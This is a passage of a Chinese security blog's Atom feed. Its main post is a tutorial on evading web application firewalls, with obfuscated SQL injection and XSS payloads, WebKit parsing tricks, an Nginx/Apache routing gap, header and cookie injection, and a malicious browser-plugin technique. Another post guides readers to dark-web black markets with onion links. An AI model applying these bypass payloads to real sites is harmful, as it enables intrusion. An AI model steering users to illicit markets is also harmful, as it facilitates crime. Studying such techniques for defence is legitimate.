&lt;p&gt;正好这几天被mongoose搞的有点烦，想看会电影放松一下心情，但是代码还是要写的，于是我想把电影下载下来，然后等bug解决了，再看。所以问题来了。&lt;br&gt;
    
    </summary>
    
    
      <category term="Other" scheme="http://bugs.cc/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>杂谈如何绕过WAF（Web应用防火墙）</title>
    <link href="http://bugs.cc/2016/08/20/%E6%9D%82%E8%B0%88%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87WAF%EF%BC%88Web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%89/"/>
    <id>http://bugs.cc/2016/08/20/杂谈如何绕过WAF（Web应用防火墙）/</id>
    <published>2016-08-20T11:04:31.000Z</published>
    <updated>2016-08-23T16:00:58.289Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="0×01-前言："><a href="#0×01-前言：" class="headerlink" title="0×01 前言："></a>0×01 前言：</h3></blockquote><p>这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。</p><p>可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;apache等。下面正式开始：）</p><a id="more"></a><blockquote><h3 id="0x02-直视WAF："><a href="#0x02-直视WAF：" class="headerlink" title="0x02 直视WAF："></a>0x02 直视WAF：</h3></blockquote><p>作为第一节，我先为大家简单的说下一些绕过WAF的方法。</p><h4 id="1、-大小写转换法："><a href="#1、-大小写转换法：" class="headerlink" title="1、 大小写转换法："></a>1、 大小写转换法：</h4><p>看字面就知道是什么意思了，就是把大写的小写，小写的大写。比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SQL：sEleCt vERsIoN();</div><div class="line">‍‍XSS：&lt;sCrIpt&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure></p><p>出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数</p><h4 id="2、-干扰字符污染法"><a href="#2、-干扰字符污染法" class="headerlink" title="2、 干扰字符污染法:"></a>2、 干扰字符污染法:</h4><p>空字符、空格、TAB换行、注释、特殊的函数等等都可以。比如下面的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SQL：sEleCt+1-1+vERsIoN   /*!*/       ();`yohehe‍‍</div><div class="line">‍‍SQL2：select/*!*/`version`();</div><div class="line">XSS：下面一节会仔细的介绍</div></pre></td></tr></table></figure></p><h4 id="3、字符编码法："><a href="#3、字符编码法：" class="headerlink" title="3、字符编码法："></a>3、字符编码法：</h4><p>就是对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等，XSS编码有：HTML、URL、ASCII、JS编码、base64等等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SQL:load_file(0x633A2F77696E646F77732F6D792E696E69)</div><div class="line">‍‍‍‍XSS：&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</div></pre></td></tr></table></figure></p><p>出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf</p><h4 id="4、拼凑法"><a href="#4、拼凑法" class="headerlink" title="4、拼凑法"></a>4、拼凑法</h4><p>如果过滤了某些字符串，我们可以在他们两边加上“原有字符串”的一部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SQL：selselectect verversionsion();</div><div class="line">‍‍‍‍XSS：&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt;</div></pre></td></tr></table></figure></p><p>出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。</p><p>本节是告诉大家，waf总会有自己缺陷的，任何事物都不可能完美。</p><blockquote><h3 id="0x03-站在webkit角度来说绕过WAF："><a href="#0x03-站在webkit角度来说绕过WAF：" class="headerlink" title="0x03 站在webkit角度来说绕过WAF："></a>0x03 站在webkit角度来说绕过WAF：</h3></blockquote><p>可能这时会有人问到，说绕过WAF，怎么跑到webkit上去了。嗯，你没有看错，我也没有疯。之说以站在webkit角度来讲绕过WAF，是因为各个代码的功能是由浏览器来解析的。那浏览器中谁又负责解析呢？那就是webkit， 既然要说到webkit，那就不得不提webkit下的解析器——词法分析器，因为我们在绕过的时候，就是利用解析器中的词法分析器来完成。</p><p>就比如一个简单的绕过WAF的XSS代码：</p><p><code>&lt;iframe src=&quot;javascript:alert(1)&quot; height=0 width=0 /&gt;&lt;iframe&gt; &lt;!--Java和script是回车，al和ert是Tab换行符--&gt;</code><br>他可以弹窗，可以为什么他可以弹窗呢？这里面有回车、换行符啊。想要理解，我们来看看webkit下的Source/javascriptcore/parser/lexer.cpp是怎么声明的吧。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (m_current != stringQuoteCharacter) &#123;</div><div class="line">    <span class="keyword">if</span> (UNLIKELY(m_current ==<span class="string">'\\'</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (stringStart != currentSourcePtr() &amp;&amp; shouldBuildStrings)</div><div class="line">            append8(stringStart, currentSourcePtr() - stringStart);</div><div class="line">        shift();</div><div class="line">        LChar escape = singleEscape(m_current);</div><div class="line">        <span class="keyword">if</span> (escape) &#123;</div><div class="line">            <span class="keyword">if</span> (shouldBuildStrings)</div><div class="line">                record8(escape);</div><div class="line">            shift();</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (UNLIKELY(isLineTerminator(m_current)))</div><div class="line">            shiftLineTerminator();</div></pre></td></tr></table></figure></p><p>注意倒数第二行里的isLineTerminator函数。这里我来说说大致的意思：所有的内容都在一个字符串里，用while逐字解析，遇到换行就跳过。然后在拼成一个没有分割符的字符串，所以这时的XSS代码成功弹窗了。<br>Webkit里的词法分析器里除了跳过换行符，还会跳过什么字符呢？</p><p>子曰：还有回车等分隔符。</p><p>根据webkit词法分析器的机制，我们就可以写更多的猥琐xss代码。</p><p>下面再说说这个注意事项：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"java</span></span></div><div class="line">script:alert(1)" <span class="attr">height</span>=<span class="string">0</span> <span class="attr">width</span>=<span class="string">0</span> /&gt;<span class="tag">&lt;<span class="name">iframe</span>&gt;</span>  <span class="comment">&lt;!--这个可以弹窗--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">java</span></span></div><div class="line"><span class="attr">script:alert</span>(<span class="attr">1</span>); <span class="attr">height</span>=<span class="string">0</span> <span class="attr">width</span>=<span class="string">0</span> /&gt;<span class="tag">&lt;<span class="name">iframe</span>&gt;</span>  <span class="comment">&lt;!--这个不可以弹窗--&gt;</span></div></pre></td></tr></table></figure><p>因为在webkit的词法分析器里，跳过回车、换行等分隔符时有个前提，那就是必须用单/双引号围住，不然不会跳过。因为如果不使用引号，词法分析器会认为 回车、换行就是结束了，如果你运行上面这段代码，webkit会把java当做地址传给src。词法分析器跳过的前提就是建立在引号里的，切记。<br>这里在说一个：</p><p>回车、换行只在属性中引号里才会起作用。如果你对标签或者属性用 回车、换行，这时你大可放心，决对不会弹窗。而且在属性值里 回车、换行随便用。如果空格出现在xss代码里并不会弹窗，但是如果出现在字符和符号之前，就可以弹了。如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/1.png" alt=""></p><p>注意事项：<br>跳过回车和换行，不支持on事件。例如下面的代码<br><code>&lt;a href=&quot;java    script:alert(1)&quot;&gt;xss&lt;/a&gt;</code>会弹窗，但是下面的代码就不行了。</p><p><code>&lt;a href=&quot;#&quot; onclick=&quot;aler    t(1)&quot;&gt;s&lt;/a&gt;</code>可见加了Tab换行，就无法弹窗了。但是还是支持字符和符号之间加入空格的。<br>本节就是告诉大家，想要玩的更好，最好追溯到底层，从底层来看攻击手法，你会发现很多问题迎刃而解。</p><blockquote><h3 id="0x04-利用Nginx-amp-Apache环境-BUG来绕过waf："><a href="#0x04-利用Nginx-amp-Apache环境-BUG来绕过waf：" class="headerlink" title="0x04 利用Nginx&amp;Apache环境 BUG来绕过waf："></a>0x04 利用Nginx&amp;Apache环境 BUG来绕过waf：</h3></blockquote><p>这个bug比较鸡肋，需要在nginx&amp;apache环境，而且管理员较大意。这是一个不是bug的bug。<br>当网站采用前端Nginx，后端Apache时，需要在conf配置，当遇到PHP后缀的时候，把请求交给Apache处理。但是Nginx判断后缀是否为PHP的原理是根据URL的。也就是说如果当URL的后缀不是PHP的时候，他并不会把PHP教给Apache处理。<br>配置:</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/2.png" alt=""></p><p>乍一看，没什么问题。但是这里隐藏一个漏洞。</p><p>我在test目录建立一个index.php：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/3.png" alt=""></p><p>利用nginx&amp;apache这个bug，再加上浏览器默认会隐藏index.php文件名，那么漏洞就来了。<br>访问<code>a.cn/test/index.php?text=&lt;script&gt;alert(1)&lt;/script&gt;</code>不会弹窗，被waf.conf给拦截了。</p><p>访问<code>a.cn/test/?text=&lt;script&gt;alert(1)&lt;/script&gt;</code>会弹窗，没有被waf.conf给拦截，因为nginx根据URL判断这不是php文件，并没有交给apache处理，也就没有走第三个location流程。</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/4.png" alt=""></p><p>本节是告诉大家，绕过WAF不用一直针对WAF，也可以利用环境/第三方的缺陷来绕过。</p><blockquote><h3 id="0x05-从HTTP数据包开始说起："><a href="#0x05-从HTTP数据包开始说起：" class="headerlink" title="0x05 从HTTP数据包开始说起："></a>0x05 从HTTP数据包开始说起：</h3></blockquote><p>1、 现在有一部分网站waf是部署在客户端上的，利用burp、fiddler就可以轻松绕过。<br>很多时候我们遇到的情况就像这段代码一样:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"text"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">onclick</span>=<span class="string">"waf()"</span>&gt;</span></div></pre></td></tr></table></figure></p><p>把waf规则放到js里。我们可以提交一个woaini字符串，然后用burp、fiddler抓包、改包、提交，轻轻松松的绕过了客服端的WAF机制。</p><p>2、有的网站，他们对百度、google、soso、360等爬虫请求并不过滤，这时我们就可以在USER-Agent伪造自己是搜索引擎的爬虫，就可以绕过waf</p><p>3、有的网站使用的是$_REQUEST来接受get post cookie参数的，这时如果waf只对GET POST参数过滤了，那么久可以在数据包里对cookie进行构造攻击代码，来实现绕过waf。</p><p>4、有的waf对GET POST COOKIE都过滤了，还可以进行绕过。怎么绕过呢？<br>假设网站会显示你的IP或者你使用的浏览器，那么你就可以对IP、user-agent进行构造，在PHP里X_FORWARDED_FOR和HTTP_CLIENT_IP两个获取IP的函数都可以被修改。<br>想详细了解的可以去：<a href="http://www.freebuf.com/articles/web/42727.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/42727.html</a> 0x06节。<br>本节告诉我们waf是死的，人是活的，思想放开。不要跟着WAF的思路走，走出自己的思路，才是最正确的。</p><blockquote><h3 id="0x06-WAF你算个屌："><a href="#0x06-WAF你算个屌：" class="headerlink" title="0x06 WAF你算个屌："></a>0x06 WAF你算个屌：</h3></blockquote><p>很多人认为绕过WAF需要根据WAF的规则来绕过。但是我们可以忽视他，进行攻击。<br>我们利用第三方插件来进行攻击，因为第三方插件的权限非常大，而且他有一个特殊的性质，就是他可以跨域。<br>我们可以事先在插件里调用一个js代码，对方安装之后浏览任何网站都可以被XSS。<br>我们现在来看段Maxthon插件的源码：</p><p>def.json</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/5.png" alt=""></p><p>test.js：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/6.png" alt=""></p><p>统一放在一个文件夹里，再用Mxpacke.exe生成一个遨游插件。</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/7.png" alt=""></p><p>双击就可以安装这个插件。</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/8.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//passwaf/9.png" alt=""></p><p>。这不算是一个漏洞，因为插件必须要运行js代码，而XSS的宗旨就是 在网站里运行你所指定的js代码。<br>所以，这个xss没办法修复，而且chrome 火狐 等浏览器都存在。</p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言：&quot;&gt;&lt;a href=&quot;#0×01-前言：&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言：&quot;&gt;&lt;/a&gt;0×01 前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。&lt;/p&gt;
&lt;p&gt;可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;amp;apache等。下面正式开始：）&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>暗网</title>
    <link href="http://bugs.cc/2016/08/20/%E6%9A%97%E7%BD%91/"/>
    <id>http://bugs.cc/2016/08/20/暗网/</id>
    <published>2016-08-20T05:40:21.000Z</published>
    <updated>2016-08-23T16:00:27.729Z</updated>
    
    <content type="html"><![CDATA[<h3 id="最后更新时间-2016-8-20-13-40-21"><a href="#最后更新时间-2016-8-20-13-40-21" class="headerlink" title="最后更新时间:2016/8/20 13:40:21"></a>最后更新时间:2016/8/20 13:40:21</h3><hr><h4 id="利用暗网进行浏览onion的流程："><a href="#利用暗网进行浏览onion的流程：" class="headerlink" title="利用暗网进行浏览onion的流程："></a><code>利用暗网进行浏览onion的流程：</code></h4><p>大陆用户，首先需要代理VPN，或者使用“蓝灯（lantern）”。来进行从tor服务器那里获得tor节点，从而进行连接，不用嫌麻烦，多层代理总是好的，虽然在tor浏览器里可以直接使用“伪造其他网站的数据传输”来进行浏览，但是缺点是慢，且不安全。详细的用法可以看这篇文章<a href="http://www.chinagfw.org/2016/06/tor.html" target="_blank" rel="external">http://www.chinagfw.org/2016/06/tor.html</a> (需要VPN或者lantern访问)</p><h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h4 id="暗网的介绍："><a href="#暗网的介绍：" class="headerlink" title="暗网的介绍："></a><code>暗网的介绍：</code></h4><p>因为介绍暗网的文章很多，我这里选一些比较好的文章</p><p><a href="http://kejiweixun.com/?p=585" target="_blank" rel="external">这是我第一次访问暗网</a></p><hr><h4 id="暗网一些推荐的网站："><a href="#暗网一些推荐的网站：" class="headerlink" title="暗网一些推荐的网站："></a><code>暗网一些推荐的网站：</code></h4><p><a href="http://mail2tor2zyjdctd.onion" target="_blank" rel="external">暗网邮箱</a><br>推荐用这个，gmail不安全，其他的临时邮箱不稳定，这个时候就需要一个可以在暗网上即使被破解也没办法知道你是谁的稳定邮箱。为了安全起见，你可以注册这样的邮箱：<code>wufnxlkfog7458bk@mail2tor.com</code>，密码也可以起成<code>tusncjdnah@*%41We</code>，不用担心忘记，后面我会说在么记录这些账户密码，而且别人无法获取的方法。</p><p><a href="http://xkow4dnkw7cusncz.onion" target="_blank" rel="external">暗网中文论坛</a><br>在暗网上，这个中文论坛应该是最大的了。适合刚入门的新手，做一个过渡。</p><p><a href="http://hss3uro2hsxfogfq.onion/" target="_blank" rel="external">not Evil</a> 支持中文搜索的暗网搜索引擎，没有广告</p><p><a href="http://xmh5752oemp2sztk.onion/" target="_blank" rel="external">TORCH</a> 另一个搜索引擎</p><p><a href="http://oasisnvwltxvmqqz.onion" target="_blank" rel="external">oasis</a> 在tor非常有名的黑市，开店不要钱</p><p><a href="http://reloadedudjtjvxr.onion" target="_blank" rel="external">SilkRoad3.0</a> SilkRoad3.0，不用多说，没有之前的 1.0、2.0好。开店要钱</p><p><a href="http://pwoah7foa6au2pul.onion" target="_blank" rel="external">Alphabay</a> 应该是tor里最大的一家黑市了，开店要钱</p><hr><h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a><code>其他：</code></h4><p>在暗网上注册的时候，大多都需要GPG，比如上面的三个黑市，全部要求GPG密钥加密，在linux下有kgpg<code>sudo apt-get install kgpg</code>，在windows上有<code>Gpg4win</code>，而我之前所说的就是利用gpg来保存密码，gpg加密后的密文是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">-----BEGIN PGP MESSAGE-----</div><div class="line">Version: GnuPG v1</div><div class="line"></div><div class="line">hQEMA1cgPhiOStPSAQf/c3TBvVq/tdciUYraeq83Fizrsx81l8BNqfGQ6wWh8EbI</div><div class="line">9LjUQWOca5iz5nVrVOQYMcDI+/UqdWFIXf5cxPskTdpdIr0n5pbpwrcbcpIhvZly</div><div class="line">GKZ88DZ4D6tpp4m3VDewUfi5+bS4ixuLHoRawC6HEq/7cnWqRWkIpPgBZsRrJuNH</div><div class="line">0CODKoQmwyR6FpmZk1/aXyfYnFI98QepfzbDgLidimnGbhX+U0GvULIxeTAZOp1G</div><div class="line">MtHvxDEZdwftKqUbyAqAU7K3Q3BK3wYfXI2GOYOpKNPhCUVHiCGwFsxWunFrRK1W</div><div class="line">4CpqZrYq79Ds7G2b9gztkf8+AJy5ElXr9IDNXnotktJIAUdWTzqNhuDPuSxYFUpS</div><div class="line">90eXoXs6PH1E/+c4+D4Hm5Sb80x6V0l0Ubcm7lDk8S8ZrENskAE9YDLwqiImCKy6</div><div class="line">c1zrRkSCTCcb</div><div class="line">=7jiE</div><div class="line">-----END PGP MESSAGE-----</div></pre></td></tr></table></figure></p><p>破解需要密钥，和解密的密码。</p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;最后更新时间-2016-8-20-13-40-21&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-20-13-40-21&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/20 13:40:21&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/20 13:40:21&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;a href=&quot;#利用暗网进行浏览onion的流程：&quot; class=&quot;headerlink&quot; title=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;/a&gt;&lt;code&gt;利用暗网进行浏览onion的流程：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;大陆用户，首先需要代理VPN，或者使用“蓝灯（lantern）”。来进行从tor服务器那里获得tor节点，从而进行连接，不用嫌麻烦，多层代理总是好的，虽然在tor浏览器里可以直接使用“伪造其他网站的数据传输”来进行浏览，但是缺点是慢，且不安全。详细的用法可以看这篇文章&lt;a href=&quot;http://www.chinagfw.org/2016/06/tor.html&quot;&gt;http://www.chinagfw.org/2016/06/tor.html&lt;/a&gt; (需要VPN或者lantern访问)&lt;/p&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
      <category term="Other" scheme="http://bugs.cc/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>优秀的URL收集</title>
    <link href="http://bugs.cc/2016/08/15/%E4%BC%98%E7%A7%80%E7%9A%84URL%E6%94%B6%E9%9B%86/"/>
    <id>http://bugs.cc/2016/08/15/优秀的URL收集/</id>
    <published>2016-08-15T13:42:07.000Z</published>
    <updated>2016-08-20T05:39:48.058Z</updated>
    
    <content type="html"><![CDATA[<h3 id="最后更新时间-2016-8-15-22-40-48"><a href="#最后更新时间-2016-8-15-22-40-48" class="headerlink" title="最后更新时间:2016/8/15 22:40:48"></a>最后更新时间:2016/8/15 22:40:48</h3><hr><h4 id="UI美工："><a href="#UI美工：" class="headerlink" title="UI美工："></a><code>UI美工：</code></h4><p>WEB安全色 ： <a href="http://www.bootcss.com/p/websafecolors/" target="_blank" rel="external">http://www.bootcss.com/p/websafecolors/</a></p><p>UI设计网  ： <a href="http://www.uisheji.com/" target="_blank" rel="external">http://www.uisheji.com/</a></p><p>阿里巴巴矢量图标库：<a href="http://www.iconfont.cn/" target="_blank" rel="external">http://www.iconfont.cn/</a></p><hr><h4 id="前端开发-JavaScript-And-CSS-："><a href="#前端开发-JavaScript-And-CSS-：" class="headerlink" title="前端开发(JavaScript And CSS)："></a><code>前端开发(JavaScript And CSS)：</code></h4><a id="more"></a><p>ICO font对比SVG font：<a href="http://www.w3cplus.com/css3/icon-fonts-vs-svg.html" target="_blank" rel="external">http://www.w3cplus.com/css3/icon-fonts-vs-svg.html</a></p><p>前端冷知识：<a href="http://www.cnblogs.com/Wayou/p/things_you_dont_know_about_frontend.html" target="_blank" rel="external">http://www.cnblogs.com/Wayou/p/things_you_dont_know_about_frontend.html</a></p><p>CSS简写法：<a href="https://github.com/yisibl/blog/issues/4" target="_blank" rel="external">https://github.com/yisibl/blog/issues/4</a></p><p>box-shadow秒懂：<a href="http://codepen.io/yisi/pen/sDBwC" target="_blank" rel="external">http://codepen.io/yisi/pen/sDBwC</a></p><p>图片延迟加载：<a href="http://caibaojian.com/lazy-load.html" target="_blank" rel="external">http://caibaojian.com/lazy-load.html</a></p><p>OurJS : <a href="http://ourjs.com/" target="_blank" rel="external">http://ourjs.com/</a></p><hr><h4 id="JavaScript："><a href="#JavaScript：" class="headerlink" title="JavaScript："></a><code>JavaScript：</code></h4><p>微软官方的JavaScript语言参考：<a href="https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94" target="_blank" rel="external">https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94).aspx</a>.aspx)</p><p>深入剖析 JavaScript 的深复制：<a href="http://jerryzou.com/posts/dive-into-deep-clone-in-javascript/" target="_blank" rel="external">http://jerryzou.com/posts/dive-into-deep-clone-in-javascript/</a></p><p>function与感叹号：<a href="http://swordair.com/function-and-exclamation-mark/" target="_blank" rel="external">http://swordair.com/function-and-exclamation-mark/</a></p><p>JavaScript的()()原理是什么：<a href="http://segmentfault.com/q/1010000002897710" target="_blank" rel="external">http://segmentfault.com/q/1010000002897710</a></p><p>Javascript如何实现接口？：<a href="http://segmentfault.com/q/1010000002370889" target="_blank" rel="external">http://segmentfault.com/q/1010000002370889</a></p><p>JavaScript回调函数怎么理解：<a href="http://segmentfault.com/q/1010000000140970" target="_blank" rel="external">http://segmentfault.com/q/1010000000140970</a></p><p>function(){…})() 与 (function(){…}()) 有什么区别：<a href="http://segmentfault.com/q/1010000000442042" target="_blank" rel="external">http://segmentfault.com/q/1010000000442042</a></p><p>详解JavaScript函数模式：<a href="http://segmentfault.com/a/1190000000758184" target="_blank" rel="external">http://segmentfault.com/a/1190000000758184</a></p><p>详解js闭包：<a href="http://segmentfault.com/a/1190000000652891" target="_blank" rel="external">http://segmentfault.com/a/1190000000652891</a></p><p>JavaScript中的闭包：<a href="http://segmentfault.com/a/1190000002805295" target="_blank" rel="external">http://segmentfault.com/a/1190000002805295</a></p><p>JavaScript性能优化小窍门：<a href="http://ourjs.com/detail/54d9a6f2232227083e00002c" target="_blank" rel="external">http://ourjs.com/detail/54d9a6f2232227083e00002c</a></p><hr><h4 id="PHP："><a href="#PHP：" class="headerlink" title="PHP："></a><code>PHP：</code></h4><p>php面向对象(OOP)编程完全教程：<a href="http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/10/1823042.html" target="_blank" rel="external">http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/10/1823042.html</a></p><hr><h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a><code>其他：</code></h4><p>在线的linux：<a href="https://koding.com/" target="_blank" rel="external">https://koding.com/</a></p><p>Jquery优秀插件：<a href="http://www.jq22.com/" target="_blank" rel="external">http://www.jq22.com/</a></p><p>在线工具合集：<a href="http://tool.lu" target="_blank" rel="external">http://tool.lu</a></p><p>在线HTTP POST/GET接口测试工具：<a href="http://www.atool.org/httptest.php" target="_blank" rel="external">http://www.atool.org/httptest.php</a></p><p>Google hosts：<a href="https://laod.org/hosts/2016-google-hosts.html" target="_blank" rel="external">https://laod.org/hosts/2016-google-hosts.html</a></p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;最后更新时间-2016-8-15-22-40-48&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-15-22-40-48&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/15 22:40:48&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/15 22:40:48&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;UI美工：&quot;&gt;&lt;a href=&quot;#UI美工：&quot; class=&quot;headerlink&quot; title=&quot;UI美工：&quot;&gt;&lt;/a&gt;&lt;code&gt;UI美工：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;WEB安全色 ： &lt;a href=&quot;http://www.bootcss.com/p/websafecolors/&quot;&gt;http://www.bootcss.com/p/websafecolors/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;UI设计网  ： &lt;a href=&quot;http://www.uisheji.com/&quot;&gt;http://www.uisheji.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;阿里巴巴矢量图标库：&lt;a href=&quot;http://www.iconfont.cn/&quot;&gt;http://www.iconfont.cn/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;前端开发-JavaScript-And-CSS-：&quot;&gt;&lt;a href=&quot;#前端开发-JavaScript-And-CSS-：&quot; class=&quot;headerlink&quot; title=&quot;前端开发(JavaScript And CSS)：&quot;&gt;&lt;/a&gt;&lt;code&gt;前端开发(JavaScript And CSS)：&lt;/code&gt;&lt;/h4&gt;
    
    </summary>
    
    
      <category term="Other" scheme="http://bugs.cc/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>自动化检测CSRF(第二篇)</title>
    <link href="http://bugs.cc/2016/06/23/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BCSRF%EF%BC%88%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%89/"/>
    <id>http://bugs.cc/2016/06/23/自动化检测CSRF（第二章）/</id>
    <published>2016-06-23T15:49:34.000Z</published>
    <updated>2016-08-23T16:02:32.189Z</updated>
    
